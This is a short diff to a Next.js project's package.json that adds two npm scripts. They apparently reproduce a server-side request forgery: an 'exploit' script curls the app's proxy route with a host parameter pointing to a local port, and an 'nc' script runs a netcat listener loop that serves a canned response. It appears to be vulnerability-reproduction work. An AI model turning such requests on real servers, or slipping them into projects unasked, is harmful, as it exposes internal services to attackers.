@@ -5,6 +5,8 @@
   "scripts": {
     "dev": "next dev",
     "build": "next build",
+    "exploit": "curl 'http://localhost:3000/api/proxy/v1/hello?host=http://127.0.0.1:8092'",
+    "nc": "bash -c 'while true; do { cat response.txt; } | nc -l 8092; done'",
     "start": "next start",
     "lint": "next lint"
   },
